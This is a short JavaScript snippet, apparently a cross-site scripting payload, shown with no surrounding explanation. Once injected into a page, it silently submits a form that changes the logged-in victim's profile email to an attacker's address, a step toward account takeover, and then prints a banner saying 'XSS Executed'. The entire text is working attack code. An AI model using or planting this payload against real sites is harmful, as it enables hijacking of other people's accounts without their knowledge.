fetch('/profile', {
    method: 'POST',
    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
    body: 'email=hacker@evil.com'
}).then(function() {
    document.write('<h1>XSS Executed</h1>');
});
